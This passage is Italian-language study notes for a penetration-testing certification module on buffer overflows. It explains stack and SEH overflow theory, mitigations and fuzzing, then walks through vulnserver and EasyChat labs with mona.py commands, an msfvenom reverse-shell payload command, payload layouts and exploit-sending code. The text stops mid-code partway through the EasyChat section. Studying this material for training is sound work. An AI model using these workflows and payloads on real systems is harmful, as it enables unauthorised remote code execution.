---
title: "Modulo 09 — Exploit Development: Buffer Overflows (Sintesi Consolidata)"
tags:
  - asm
  - av-evasion
  - beef
  - bof
  - browser
  - c2
  - empire
  - exploit-dev
  - metasploit
  - msfvenom
  - nmap
  - nse
  - obfuscation
  - registers
  - seh
  - shellcode
  - shellter
  - stack
---
# Modulo 09 — Exploit Development: Buffer Overflows (Sintesi Consolidata)

> **Corso:** eCPPT Penetration Testing Professional (NEW — 2024)
> **Modulo:** Exploit Development Buffer Overflows · **Video coperti:** 8/8
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Obiettivo della sintesi:** unico documento di studio per ripassare l'intero modulo, allenarsi sui workflow operativi (stack-based + SEH) e fissare i comandi `mona.py` e `msfvenom` necessari per il pratico eCPPT.

## Indice

1. [Mappa del modulo](#1-mappa-del-modulo)
2. [Cosa sono i Buffer Overflow](#2-cosa-sono-i-buffer-overflow)
3. [Stack frame e meccanica del crash](#3-stack-frame-e-meccanica-del-crash)
4. [Heap overflow (cenni, fuori scope)](#4-heap-overflow-cenni-fuori-scope)
5. [Memory protections e cosa il corso bypassa](#5-memory-protections-e-cosa-il-corso-bypassa)
6. [Finding Buffer Overflows: code review & funzioni unsafe](#6-finding-buffer-overflows-code-review--funzioni-unsafe)
7. [Fuzzing: tool e workflow](#7-fuzzing-tool-e-workflow)
8. [Lab 1 — vulnserver / TRUN (stack-based)](#8-lab-1--vulnserver--trun-stack-based)
9. [Windows Stack Overflow — Workflow completo in 7 step](#9-windows-stack-overflow--workflow-completo-in-7-step)
10. [SEH (Structured Exception Handling) — teoria](#10-seh-structured-exception-handling--teoria)
11. [SEH Overflow — Workflow completo](#11-seh-overflow--workflow-completo)
12. [Lab 2 — EasyChat Server (SEH practical)](#12-lab-2--easychat-server-seh-practical)
13. [Mona.py cheat sheet](#13-monapy-cheat-sheet)
14. [Msfvenom cheat sheet](#14-msfvenom-cheat-sheet)
15. [Python exploit skeleton (TCP socket)](#15-python-exploit-skeleton-tcp-socket)
16. [Tabella di confronto Stack BO vs SEH BO](#16-tabella-di-confronto-stack-bo-vs-seh-bo)
17. [Bad chars: lista universale e protocollo-specifica](#17-bad-chars-lista-universale-e-protocollo-specifica)
18. [Cosa il corso NON copre](#18-cosa-il-corso-non-copre)
19. [Domande tipiche eCPPT su questo modulo](#19-domande-tipiche-ecppt-su-questo-modulo)
20. [Collegamenti ai file originali](#20-collegamenti-ai-file-originali)

---

## 1. Mappa del modulo

Il modulo è strutturato come una progressione lineare da teoria a pratica end-to-end. Il filo conduttore è il **passaggio dal crash all'arbitrary code execution** su Windows 32-bit.

```
[01] Course Introduction          → tools, learning path
   ↓
[02] Introduction to BO           → definizione, demo C su Linux
   ↓
[03] Finding BO                   → tecniche di discovery, funzioni unsafe
   ↓
[04] Finding BO with Fuzzing      → Spike + vulnserver (TRUN)
   ↓
[05] Windows Stack Overflows      → teoria stack BO + workflow standard
   ↓
[06] SEH (theory)                 → linked list + dispatcher SEH
   ↓
[07] Windows SEH Overflow         → lab EasyChat end-to-end
   ↓
[08] Course Conclusion            → recap learning objectives
```

I **4 Learning Objectives** dichiarati nel video 01 (e ripresi nel video 08):

1. **Basics of memory exploitation** — memory management nei SO e cause root delle vulnerabilità.
2. **Identify & exploit BO** — riconoscere BO in applicazioni e craftare exploit.
3. **Analyze stack-based overflows** — analisi root cause e control flow hijacking.
4. **SEH overflows on Windows** — identificare ed exploitare SEH-based overflow per ACE.

Prerequisiti dichiarati: forte conoscenza C/C++, Windows + Linux fundamentals, networking TCP/IP, e — soprattutto — **assembly x86 + memoria di processo** (coperti nel modulo *System Security*).

---

## 2. Cosa sono i Buffer Overflow

Un **buffer** è una qualsiasi area di memoria contigua che contiene più di un dato. Un **buffer overflow** è la condizione in cui una funzione **copia in un buffer più dati di quanti questo possa contenere**, sovrascrivendo memoria adiacente.

### Definizione formale

> Un buffer overflow è una condizione in un programma in cui una funzione tenta di copiare in un buffer più dati di quanti sia stato dimensionato per contenere. Causa: mancato bounds check o input validation.

### Esempio numerico (video 02)

Si allocano 40 byte sullo stack per 10 interi (4 byte ciascuno). Inviando 11 interi (~44 byte), i 4 byte in eccesso vanno a sovrascrivere ciò che si trova **subito dopo** il buffer in memoria — tipicamente saved EBP, poi saved EIP.

### Tipologie

| Tipo | Dove vive il buffer | Trattato nel corso? |
|---|---|---|
| **Stack-based BO** | Stack di chiamata della funzione (variabili locali) | **SÌ** — focus principale del modulo |
| **Heap-based BO** | Heap allocato con `malloc`/`new` | NO — solo menzionato |
| **BSS / data overflow** | Sezione dati statici | NO |
| **Integer overflow** (cause indirette di BO) | Aritmetica → wrap-around | NO |

Il corso si concentra **esclusivamente sullo stack-based BO** in due varianti:
- **Classico** (overwrite di EIP / return address) → video 05.
- **SEH-based** (overwrite della SEH chain) → video 06-07.

### Linguaggi a rischio

- **Unsafe / native**: C, C++, codice assembly, driver, firmware. Permettono pointer aritmetico e accesso raw alla memoria → vulnerabili.
- **Managed / interpretati**: C#, VB.NET, Java, Python, Go, Rust. Gestione automatica della memoria → **immuni ai BO classici**.

Punto chiave (Alexis lo ripete più volte): non è il linguaggio a essere "rotto", ma il **modo in cui le funzioni unsafe vengono usate** senza bounds check.

### Vettori di trigger

1. **User input** — parametri CLI, campi form, argomenti di funzione.
2. **Data loaded from disk** — parser di file (immagini, PDF, archivi, configurazioni).
3. **Network data** — servizi listening (FTP, SMTP, HTTP custom, IoT firmware).

I servizi di rete vulnerabili sono il **bersaglio classico per RCE remoto** (vedi `vulnserver` / `EasyChat`).

### Obiettivo dell'attaccante

Non solo **crashare** il programma (DoS), ma:

1. Riempire il buffer fino a EIP.
2. Sovrascrivere EIP con un **indirizzo valido** che punti allo shellcode o a un gadget intermedio (`JMP ESP` / `POP POP RET`).
3. Posizionare lo **shellcode** in memoria raggiungibile da quell'indirizzo.

---

## 3. Stack frame e meccanica del crash

### Layout dello stack (richiamato dal modulo System Security)

Lo stack è una regione LIFO gestita per le chiamate a funzione. Su x86 cresce **verso il basso** (verso indirizzi più bassi).

```
High address (fondo dello stack):
   +-----------------------------+
   | Function parameters         |
   | Return address (saved EIP)  |  ← target del BO classico
   | Saved EBP (caller)          |
   | Local variables             |
   | buffer[N]                   |  ← qui scrivi
   +-----------------------------+
Low address (top dello stack — ESP):
```

**Paradosso apparente**: lo stack cresce verso indirizzi più bassi, ma `strcpy`/`memcpy` scrivono **dall'indirizzo basso verso l'alto** (incremento del pointer di scrittura). Quindi sovrascrivere oltre il buffer significa **calpestare saved EBP → return address → args** del frame chiamante.

### Cosa succede al `RET`

L'epilogue tipico di una funzione x86 è:

```
mov esp, ebp
pop ebp
ret             ; equivalente a: pop eip ; jmp eip
```

Se l'attaccante ha sovrascritto la zona di return address con `0x41414141` (4 "A"), la CPU eseguirà `jmp 0x41414141` → **access violation** perché quell'indirizzo (di solito) non è mappato come eseguibile.

Se invece l'attaccante ha sovrascritto con un **indirizzo valido controllato** (es. un `JMP ESP` in una DLL), la CPU salta lì → `JMP ESP` → esegue ciò che si trova al top dello stack (= shellcode dell'attaccante).

### Demo Linux (video 02)

```c
// test.c — vulnerabile
#include <string.h>
int main(int argc, char *argv[]) {
    char buffer[10];
    strcpy(buffer, argv[1]);   // nessun bounds check
    return 0;
}
```

```bash
gcc -fno-stack-protector -z execstack test.c -o test
./test $(python -c "print 'A'*35")
# → Segmentation fault (core dumped)
```

Con `gcc` standard (canary attivo) si ottiene invece `*** stack smashing detected ***: terminated`.

Fix con `strncpy(buffer, argv[1], 10)` → nessun crash perché vengono copiati solo 10 byte, il resto viene scartato.

### Endianness

x86 è **little-endian**: gli indirizzi vanno scritti nel payload in **reverse byte order**.

```
0xDEADBEEF  →  \xEF\xBE\xAD\xDE
0x625011AF  →  \xAF\x11\x50\x62
```

In Python: `struct.pack("<I", 0x625011AF)`.

### Registri x86 chiave per BO

| Registro | Significato | Ruolo nel BO |
|---|---|---|
| **EIP** | Instruction Pointer | Cosa l'attaccante vuole controllare |
| **ESP** | Stack Pointer (top) | Dove di solito atterra il payload post-`JMP ESP` |
| **EBP** | Base Pointer (frame) | Riferimento al frame corrente; viene sovrascritto prima di EIP |
| **EAX/EBX/ECX/EDX** | General purpose | Possibili target di `POP` nei gadget SEH |
| **FS:[0]** | Thread Information Block | Punta alla testa della **SEH chain** |

In x86_64 EIP/ESP/EBP diventano **RIP/RSP/RBP**, ma il corso resta **interamente 32-bit**.

---

## 4. Heap overflow (cenni, fuori scope)

L'heap è la regione gestita da `malloc`/`free` (C) o `new`/`delete` (C++). Un **heap overflow** sovrascrive metadati del chunk allocato o chunk adiacenti, e può portare a:

- Sovrascrittura di pointer applicativi → arbitrary read/write.
- Manipolazione dei metadati dell'allocator → **unlink attack**, **House of …** (tecniche storiche su glibc).

Il corso eCPPT **non copre** heap overflow, use-after-free, double free, type confusion. Sapere che esistono ed essere in grado di distinguerli da uno stack BO è sufficiente per l'esame.

---

## 5. Memory protections e cosa il corso bypassa

Le mitigazioni moderne rendono i BO classici molto più difficili. Riepilogo:

| Mitigazione | Cosa fa | Bypass nel corso? |
|---|---|---|
| **Stack canary** (`-fstack-protector` su GCC, `/GS` su MSVC) | Mette un valore random tra local vars e saved EIP; lo verifica al `ret`. Se diverso → abort | **No** — su Linux si compila con `-fno-stack-protector`; su Windows i target lab sono compilati senza |
| **DEP / NX** (Data Execution Prevention / No-eXecute) | Marca lo stack/heap come **non eseguibile** | **Parzialmente**: usando `JMP ESP` in una DLL eseguibile si rimbalza nel codice utente, ma il vero bypass (ROP) **non è in scope** |
| **ASLR** (Address Space Layout Randomization) | Randomizza la base degli moduli a ogni esecuzione | **No**: si scelgono moduli con `ASLR: False` in `!mona modules` (DLL custom, EXE legacy) |
| **Rebase** | Variante: il modulo può essere rilocato a ogni load | Si evita scegliendo moduli `Rebase: False` |
| **SafeSEH** (`/SAFESEH` su MSVC) | Lista whitelist di handler validi nel binario; il dispatcher verifica che il SEH handler sia in lista | **Bypass**: scegliere un gadget POP POP RET in modulo `SafeSEH: False` |
| **SEHOP** (Structured Exception Handler Overwrite Protection) | Verifica runtime dell'integrità della SEH chain (record finale = handler di sistema) | **Non bypassato**: tecniche avanzate, **fuori scope eCPPT** |
| **CFG** (Control Flow Guard) / **CET** (Intel Control-flow Enforcement) | Verifica gli indirect call/jmp contro una bitmap di target validi | **Non trattato** |
| **PIE** (Position Independent Executable, Linux) | Equivalente ASLR sul main binary | **Non trattato** (corso focalizzato su Windows) |

Negli esercizi del corso (vulnserver, EasyChat) le protezioni sono **disabilitate** o presenti solo su moduli di sistema, mentre almeno **un modulo "vulnerabile"** (DLL custom) ha tutte le mitigazioni a `False`. È esattamente lì che si cercano i gadget con mona.

---



### Quiz: Fondamenti, stack frame e memory protections

<div class="ecppt-quiz" data-module="09_Buffer_Overflows" data-block="0"></div>

## 6. Finding Buffer Overflows: code review & funzioni unsafe

Saper **identificare** una BO vale quanto saperla exploitare. Le tecniche principali sono:

1. **Reazione al crash** — programma di terze parti che crasha durante uso normale → fire-up del debugger e analisi.
2. **Cloud / vendor fuzzing** — la maggior parte dei BO triviali sui big vendor è già stata patchata via CI/CD fuzzing.
3. **Dynamic analysis (fuzzing + tracing)** — invio massivo di input malformati al binario/servizio.
4. **Static review** — audit del codice sorgente alla ricerca di funzioni unsafe.

### Funzioni C **unsafe** vs versioni **safe**

| Funzione unsafe | Versione safe | Problema |
|---|---|---|
| `strcpy(dst, src)` | `strncpy(dst, src, n)` | Nessun limite sulla lunghezza copiata |
| `strcat(dst, src)` | `strncat(dst, src, n)` | Concatena senza bounds |
| `gets(buf)` | `fgets(buf, n, stream)` | Legge stdin senza limite (deprecata) |
| `sprintf(buf, fmt, ...)` | `snprintf(buf, n, fmt, ...)` | Format string senza limite output |
| `vsprintf(...)` | `vsnprintf(...)` | Idem |
| `memcpy(dst, src, n)` | uso corretto con check su `n` | Vulnerabile se `n` deriva da input |
| `scanf("%s", buf)` | `scanf("%Ns", buf)` con N esplicito | Lettura senza limite |
| `printf(user_input)` | `printf("%s", user_input)` | Format string vulnerability |

**Punto chiave**: queste funzioni non sono *intrinsecamente* rotte — è l'**uso senza bounds check** che le rende un problema.

### Realismo (citazione dal video 03)

> Almeno il 50% delle vulnerabilità scoperte non è exploitabile in modo tangibile — molte portano a DoS o side-effect, non a RCE.

Trasformare un crash in arbitrary code execution richiede:
- EIP controllabile da input.
- Spazio sufficiente per shellcode.
- Bypass eventuale di DEP/ASLR/SafeSEH.

### Tooling di discovery

| Strumento | Categoria | Note |
|---|---|---|
| **Immunity Debugger** | Debugger Windows | Standard di riferimento del corso |
| **x64dbg / WinDbg** | Debugger Windows | Alternative |
| **GDB + GEF/peda** | Debugger Linux | Analisi crash su ELF |
| **ltrace / strace** | Tracing Linux | Vedere chiamate a `strcpy` & co. |
| **API Monitor** | Tracing Windows | Hook su `strcpy`, `memcpy`, ecc. |
| **Flawfinder / RATS** | SAST C/C++ | Report di funzioni rischiose |
| **CodeQL / Semgrep** | SAST moderno | Pattern matching semantico |
| `grep -rnE "\b(strcpy|strcat|gets|sprintf)\b" src/` | Audit ad-hoc | Static review veloce |

```bash
# Static audit veloce su un albero di sorgenti C
grep -rnE "\b(strcpy|strcat|gets|sprintf|vsprintf)\b" src/

# Flawfinder — report di funzioni rischiose
flawfinder src/

# Trace delle chiamate libc su un binario Linux
ltrace ./target AAAA...
```

---

## 7. Fuzzing: tool e workflow

**Fuzzing** = tecnica di test che invia **input invalidi/inattesi/random** a un programma per scatenare comportamenti anomali (crash o behavior inatteso). Nel contesto BO: invio di dati malformati per provocare overwrite di buffer e overwrite di EIP.

### Caratteristiche

- È un **problema esponenziale** e **resource-intensive** → non si può testare tutto.
- Approccio mirato: si fuzza un singolo comando/endpoint per volta.
- Bersagli ideali: **software legacy / di nicchia / IoT** dove i bug residui sono più probabili.

### Tipologie di input fuzzabili

- Command line, parametri
- Network data, packet
- File input, database
- Shared memory, env vars
- Mouse / keyboard / device input

### Tool del corso e alternative

| Tool | Tipo | Note |
|---|---|---|
| **Spike** | Network fuzzer (TCP/UDP) | Tool didattico INE; script `.spk` + interpreter `generic_send_tcp` |
| **Boofuzz** | Network fuzzer (Python) | Erede di Sulley; più moderno e mantenuto |
| **AFL / AFL++** | Coverage-guided | Fuzz file-based, white/grey-box; richiede sorgenti o instrumentation |
| **honggfuzz** | Fuzzer (Google) | Persistent mode |
| **Peach Fuzzer** | Smart fuzzer | Protocol modeling |
| **Custom Python fuzzer** | Socket-based ad-hoc | Quick & dirty per servizi semplici |

### Spike — primitives principali

| Primitive | Scopo |
|---|---|
| `s_readline();` | Legge la prima riga dal server (es. banner welcome) |
| `s_string("TRUN ");` | Stringa **statica** da inviare (prefisso comando) |
| `s_string_variable("COMMAND");` | **Variabile** che spike riempirà con payload fuzz crescenti |
| `s_binary("\\x00\\x01");` | Inietta byte binari raw |

### Template Spike per vulnserver/TRUN

```
s_readline();
s_string("TRUN ");
s_string_variable("COMMAND");
```

### Esecuzione

```bash
generic_send_tcp <target_ip> <port> <script.spk> <SKIPVAR> <SKIPSTR>
generic_send_tcp 172.16.5.120 9999 trun.spk 0 0
```

`SKIPVAR` e `SKIPSTR` permettono di **resumere** il fuzzing saltando i primi N variabili/stringhe già testati (utile per non rifare da capo dopo un crash).

### Fuzzer Python custom (alternativa minimal)

```python
#!/usr/bin/env python3
# Probe iniziale di un servizio TCP per crash discovery
import socket, time

target = ("10.0.0.5", 9999)
for length in range(100, 5000, 100):
    try:
        s = socket.socket()
        s.settimeout(3)
        s.connect(target)
        s.recv(1024)
        payload = b"TRUN /.:/" + b"A" * length
        s.send(payload + b"\r\n")
        s.close()
        print(f"[+] sent {length} bytes")
        time.sleep(0.2)
    except Exception as e:
        print(f"[-] Crash a {length} byte: {e}")
        break
```

Quando il servizio smette di rispondere → si attacca Immunity al processo e si riprova per catturare il crash su EIP.

### Boofuzz — esempio minimale

```python
from boofuzz import *

session = Session(target=Target(connection=SocketConnection("10.0.0.5", 9999, proto="tcp")))

s_initialize("trun")
s_string("TRUN", fuzzable=False)
s_delim(" ", fuzzable=False)
s_string("FUZZ")        # questo campo verrà mutato
s_static("\r\n")

session.connect(s_get("trun"))
session.fuzz()
```

---



### Quiz: Discovery, code review e fuzzing

<div class="ecppt-quiz" data-module="09_Buffer_Overflows" data-block="1"></div>

## 8. Lab 1 — vulnserver / TRUN (stack-based)

### Setup

- **Attacker**: Kali Linux.
- **Target**: Windows 7 (es. `172.16.5.120`, user `INEUser` / `P@ssw0rd`).
- **Servizio**: `vulnserver.exe` in ascolto su **TCP/9999**.
- **Modulo helper**: `essfunc.dll` (senza ASLR/SafeSEH/Rebase/NXCompat) — **fonte canonica di gadget JMP ESP**.

### Workflow operativo

1. **Start vulnserver** sul Windows 7 → in ascolto su 9999.
2. **Test base con netcat**:
   ```
   nc 172.16.5.120 9999
   Welcome to Vulnerable Server! Enter HELP for help.
   HELP    # lista comandi: STATS, RTIME, LTIME, SRUN, TRUN, GMON, GDOG, ...
   ```
3. **Fuzz con Spike** → vulnserver **crasha** sul comando `TRUN`.
4. **Riavvia vulnserver** e **attach con Immunity Debugger** (`File → Attach → vulnserver` → `F9 Run`).
5. **Rilancia il fuzz** → Immunity mostra `Access Violation when executing [41414141]` → EIP sovrascritto da `A` controllate. Confermato: **EIP controllabile**.
6. **Wireshark** su Kali (`tcp.port == 9999`, follow TCP stream) per identificare quale payload ha causato il crash → conversazioni **senza** la response `TRUN COMPLETE`.
7. Identificato il **var index** (es. variabile 1) → si può rifuzzare con `SKIPVAR=03` per saltare oltre e raffinare.
8. Si segue la **workflow standard stack-based** (sezione successiva).

### Demo finale

Alexis non sviluppa l'intero exploit on-camera ma mostra un POC Python già pronto che esegue **`calc.exe`** sul target → conferma RCE via BO sul comando `TRUN`.

---

## 9. Windows Stack Overflow — Workflow completo in 7 step

Questo è il workflow **da sapere a memoria** per l'esame eCPPT. Vale per qualsiasi stack-based BO Windows con `JMP ESP`.

### Step 1 — Triggera il crash

Si determina la dimensione approssimativa del payload che causa il crash:

```python
# Probe con lunghezze crescenti
for length in range(100, 5000, 100):
    send(b"A" * length)
```

Quando EIP = `41414141` (= `0x41` * 4) nel debugger → crash confermato. Si annota la lunghezza minima che causa il crash (es. 3000 byte).

### Step 2 — Calcola l'offset EIP

Si genera una **cyclic pattern** unica (ogni 4 byte è una sottostringa unica → permette di calcolare l'offset dal valore di EIP catturato):

```bash
# CLI Linux
msf-pattern_create -l 3000

# In Immunity (mona)
!mona pattern_create -l 3000
```

Si invia il pattern come payload, si legge EIP nel debugger dopo il crash, si calcola offset:

```bash
msf-pattern_offset -q 386F4337
!mona pattern_offset -d 0x386F4337
```

→ output: `Pattern found at offset 2003` (esempio).

**Verifica dell'offset**: si invia `b"A"*2003 + b"B"*4 + b"C"*N`. Dopo il crash EIP deve essere `42424242` ed ESP deve puntare a `C…C`.

### Step 3 — Identifica bad chars

I bad chars sono byte che il programma **altera, tronca o non accetta** lungo il path di input (es. `\x00` come NULL terminator, `\x0A` newline, `\x0D` carriage return).

```
# In Immunity:
!mona bytearray -cpb "\x00"
```

Mona genera due file: `bytearray.bin` e `bytearray.txt` con tutti i byte da `\x01` a `\xFF` (escludendo già `\x00`).

Nel POC, dopo EIP, si invia l'intero bytearray:

```python
badchars = bytes(b for b in range(1, 256))
payload  = b"A"*OFFSET + b"B"*4 + badchars
```

Dopo il crash, in Immunity si compara la memoria a partire da ESP con il file atteso:

```
!mona compare -f c:\mona\<app>\bytearray.bin -a <ESP_addr>
```

Output: lista dei byte alterati / assenti = **bad chars**. Si rigenera il bytearray escludendoli (`!mona bytearray -cpb "\x00\x0a\x0d"`) e si ripete finché non ci sono più alterazioni.

### Step 4 — Trova JMP ESP gadget

Si serve un indirizzo stabile di un'istruzione `JMP ESP` (opcode `\xFF\xE4`) in un modulo **senza** protezioni che lo rebase-rebbero o validerebbero.

```
!mona modules
```

Output tipico:

```
 Base       | Top        | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll
 0x62500000 | 0x62508000 | False  | False   | False | False    | False    essfunc.dll  ← BUONO
 0x77c10000 | 0x77c68000 | True   | True    | True  | True     | True     msvcrt.dll
```

→ scegliere il modulo con tutto a `False`:

```
!mona jmp -r esp -cpb "\x00\x0a\x0d" -m essfunc.dll
```

Si ottiene una lista di indirizzi candidati (es. `0x625011AF`). Si verifica in Immunity (CTRL+G → indirizzo) che il modulo non sia stato rebased e che l'istruzione sia effettivamente `JMP ESP`.

### Step 5 — Genera shellcode

```bash
msfvenom -p windows/shell_rev⁠erse_tcp \
         LHOST=10.10.10.10 LPORT=4444 \
         -b "\x00\x0a\x0d" \
         -f c -v shellcode
```

Flag chiave:
- `-p windows/shell_rev⁠erse_tcp` — payload (alternative: `windows/exec CMD=calc.exe` per demo, `windows/meter⁠preter/reverse_tcp` per meterpreter).
- `-b "..."` — bad chars da evitare (il framework codifica per evitarli).
- `-f c|python|exe|raw` — formato output.
- `-v shellcode` — nome della variabile generata.
- `-i N` — numero di iterazioni dell'encoder (default `x86/shikata_ga_nai`).
- `-e <encoder>` — encoder esplicito (es. `x86/shikata_ga_nai`).

### Step 6 — Costruisci il payload

```
payload = [prefix]
        + [b"A" * OFFSET]      # junk fino a EIP
        + [EIP = JMP ESP addr] # struct.pack("<I", 0x625011AF)
        + [NOP sled: \x90 * N] # margine per il salto
        + [shellcode]          # dal msfvenom
```

Il **NOP sled** (es. `\x90 * 32`) dà margine quando `JMP ESP` non punta esattamente all'inizio dello shellcode (variazioni minime di ESP fra esecuzioni).

### Step 7 — Lancia l'exploit

```python
import socket
s = socket.socket()
s.connect(("10.10.10.50", 9999))
s.recv(1024)
s.send(payload + b"\r\n")
s.close()
```

Verifica del successo: listener `nc -lvnp 4444` sull'attacker → reverse shell ricevuta.

---



### Quiz: Lab vulnserver e workflow stack 7-step

<div class="ecppt-quiz" data-module="09_Buffer_Overflows" data-block="2"></div>

## 10. SEH (Structured Exception Handling) — teoria

**SEH** = meccanismo Windows per gestire eccezioni (access violation, divide-by-zero, stack overflow, ecc.) in modo strutturato. Implementato come **linked list di SEH record** sullo stack.

### Struttura di un SEH record

Ogni record è una `EXCEPTION_REGISTRATION_RECORD` di **8 byte**:

```
Offset  Field           Size
+0      Next SEH (NSEH) 4 byte  ← puntatore al prossimo record
+4      SEH Handler     4 byte  ← puntatore alla funzione handler
```

I record sono **incatenati** sullo stack; la testa è puntata da **`FS:[0]`** (Thread Information Block). L'ultimo record ha `NSEH = 0xFFFFFFFF` e handler = **default exception handler** di sistema.

### Registrazione tipica in C/C++

```c
__try {
    risky_operation();
}
__except(EXCEPTION_EXECUTE_HANDLER) {
    handle_it();
}
```

Il prologo `__try` fa push di un nuovo SEH record sullo stack.

### Dispatch flow

1. Funzione vulnerabile alloca buffer + registra `__try/__except`.
2. Si verifica un'**eccezione** (es. access violation perché si scrive oltre stack valido).
3. Il kernel attraversa la SEH chain partendo da `FS:[0]`, chiama in ordine ogni handler.
4. Se un handler "consuma" l'eccezione, l'esecuzione prosegue normalmente; altrimenti si arriva al default → crash.

### SEH-based overflow — meccanica

1. **Vulnerability identification**: input scrive oltre il buffer locale e raggiunge un SEH record sullo stack (situazione tipica quando lo spazio tra buffer e saved EIP è enorme e in mezzo c'è un SEH record).
2. **Overwrite di NSEH e SEH Handler** con valori controllati.
3. **Trigger dell'eccezione**: il payload stesso (proseguendo oltre) provoca un'access violation.
4. **Dispatch al SEH handler malevolo**: il kernel chiama l'indirizzo che l'attaccante ha scritto in `SEH Handler`.
5. **Code execution**: il valore di `SEH Handler` punta a un **gadget POP POP RET** che riporta l'esecuzione su `NSEH` (anch'esso controllato), che è uno **short jump** che salta sopra il SEH handler e atterra sullo shellcode.

### Perché POP POP RET?

Quando il dispatcher chiama il SEH handler, lo stato dello stack è:

```
[ESP+0]  → pointer a EXCEPTION_RECORD
[ESP+4]  → pointer a EXCEPTION_REGISTRATION_RECORD (= ptr a NSEH)
[ESP+8]  → pointer a CONTEXT
```

Eseguendo un gadget `POP r32 ; POP r32 ; RET`:

- `POP r32` (1°) → scarta `EXCEPTION_RECORD`.
- `POP r32` (2°) → scarta `EXCEPTION_REGISTRATION_RECORD` pointer.
- `RET` → pop dell'indirizzo successivo dallo stack = **`CONTEXT` pointer**? No — in realtà il RET pesca il pointer al **registration record** lasciato sullo stack dal dispatcher, che è 4 byte prima di SEH = **ptr a NSEH**.

Risultato: la CPU salta su **NSEH**, che l'attaccante ha riempito con un **short jump** che salta oltre i 4 byte di SEH per atterrare sullo shellcode.

### Short jump in NSEH

Il pattern canonico è:

```
\xEB\x06\x90\x90
```

- `\xEB\x06` = `JMP +6` (short jump in avanti di 6 byte).
- `\x90\x90` = 2 NOP di padding (per riempire i 4 byte di NSEH).

Il `+6` salta: 2 byte rimanenti di NSEH (`\x90\x90`) + 4 byte di SEH = 6 byte → atterra **subito dopo SEH** = inizio NOP sled / shellcode.

### Mitigazioni SEH

| Mitigazione | Cosa fa | Bypass |
|---|---|---|
| **SafeSEH** (`/SAFESEH`) | Lista whitelist di handler validi nel binario; il dispatcher verifica che l'indirizzo del SEH handler appartenga a questa lista | **Bypass possibile**: trovare gadget POP POP RET in un modulo compilato **senza** SafeSEH (`SafeSEH: False` in `!mona modules`). DLL legacy / custom dell'applicazione tipicamente non hanno SafeSEH |
| **SEHOP** (Structured Exception Handler Overwrite Protection) | Mitigazione runtime: verifica che la SEH chain termini con l'handler di sistema (chain integrity check) | Bypass complesso, **fuori scope eCPPT** |
| **`/GS`** (stack canary MSVC) | Canary tra buffer e SEH record | Spesso ancora bypassabile se si raggiunge il SEH record da un overflow che non passa per il canary check |

### Differenza stack BO classico vs SEH BO

| Aspetto | Stack BO classico | SEH BO |
|---|---|---|
| Target overwrite | **Return address (EIP)** | **SEH record** (NSEH + SEH handler) |
| Trigger esecuzione | `RET` della funzione | **Eccezione** triggerata dal payload |
| Gadget tipico | `JMP ESP` | **POP POP RET** |
| Esegue subito? | Sì, al `RET` | No, serve un'eccezione |
| Comando `!mona` | `!mona jmp -r esp` | `!mona seh` |
| Mitigazione principale | DEP/NX, ASLR | **SafeSEH**, SEHOP |

---

## 11. SEH Overflow — Workflow completo

### Layout del payload SEH

```
| junk filler   |  NSEH (4 byte)            |  SEH (4 byte)        |  NOP sled + shellcode | tail trigger |
| <offset>      |  short jmp (EB 06 90 90)  |  ptr POP POP RET     |  payload da eseguire  | filler       |
```

### Step-by-step

1. **Trigger dell'eccezione** — fuzz finché si ottiene un crash gestito dal SEH dispatcher (in Immunity vedi `Access violation` + `View → SEH chain` mostra valori `41414141`).
2. **Pass exception to application** in Immunity con **Shift+F7** (o F8/F9) → si lascia che il dispatcher SEH provi a chiamare l'handler. Se EIP = `41414141` → SEH handler controllabile, vai avanti.
3. **Identifica offset NSEH** con `!mona pattern_create` + `!mona pattern_offset -d <val>` letto dal SEH chain dopo il crash.
4. **Trova POP POP RET gadget**:
   ```
   !mona seh -cpb "\x00\x0a\x0d"
   ```
   Mona elenca i gadget POP POP RET in moduli **senza SafeSEH/ASLR/Rebase**.
5. **Bad chars** — workflow standard con `!mona bytearray` + `!mona compare`.
6. **NSEH = short jump back** = `\xEB\x06\x90\x90` (JMP +6, 2 NOP di pad).
7. **Genera shellcode** con `msfvenom -b "<bad>" -f python`.
8. **Costruisci payload**: `junk + NSEH + SEH + NOPs + shellcode + tail`. Il **tail trigger** (filler finale) può essere necessario per forzare l'eccezione (scrittura oltre stack valido).
9. **Lancia exploit** → eccezione triggerata → dispatcher chiama POP POP RET → atterra su NSEH → short jump → shellcode → RCE.

---

## 12. Lab 2 — EasyChat Server (SEH practical)

### Setup

- **Target**: Windows VM con **EasyChat Server** installato sul Desktop.
- **Avvio**: doppio click sull'eseguibile → **Try it** (modalità trial senza licenza) → servizio attivo su **HTTP/80**.
- **Debugger**: Immunity Debugger → `File → Attach → easychat` → **F9** per `Running`.
- **Skeleton exploit**: fornito dal lab, contiene già connect su porta 80, header HTTP con `User-Agent` come vettore d'iniezione, e un buffer iniziale (`A * 725` circa).
- **Vettore**: parametro HTTP GET `/chat.ghp?username=<payload>`.

### Workflow del lab

1. **Avvio EasyChat** → attach con Immunity Debugger (F9 Run).
2. **Lancio dello skeleton exploit** Python → osservazione del crash (`Access violation when reading [XXXXXXXX]`).
3. **Shift+F7** per passare l'eccezione → verifica che **EIP è controllabile via SEH overwrite** (`View → SEH chain` mostra `41414141`).
4. **Genera pattern** con `!mona pattern_create 717` → sostituisce il buffer A*N nello skeleton.
5. Pattern salvato in: `C:\Program Files\Immunity Inc\Immunity Debugger\pattern.txt`.
6. **Restart + reattach** → invio pattern → lettura SEH crashed (es. `0x386F4337`) → `!mona pattern_offset -d 0x386F4337` per ricavare offset al NSEH.
7. **`!mona seh -cpb "\x00\x0a\x0d\x20\x26\x3d"`** → lista gadget POP POP RET in DLL legacy di EasyChat (no SafeSEH).
8. **Bad chars** con `!mona bytearray` + `!mona compare`.
9. **Costruzione payload finale**: `junk + NSEH(\xEB\x06\x90\x90) + SEH(POP POP RET) + NOPs + shellcode (calc.exe) + tail`.
10. **POC funzionante** → riavvio EasyChat → `Try it` → lancio exploit → si apre `calc.exe` sul target.

### Citazione del video

> *"this exploit has been posted in the lab documentation [...] you can see we were successfully able to exploit the SEH overflow and again we proved it by performing some command execution. Of course you can try and replace the shellcode with your own if you want to get a reverse shell or a Meterpreter session."*

### Skeleton exploit (semplificato)

```python
#!/usr/bin/env python3
import socket

TARGET = "10.10.10.50"
PORT   = 80

buffer = b"A" * 725

http_req  = b"GET /chat.ghp?username=" + buffer
http_req += b" HTTP/1.1\r\n"
http_req += b"Host: " + TARGET.encode() + b"\r\n"
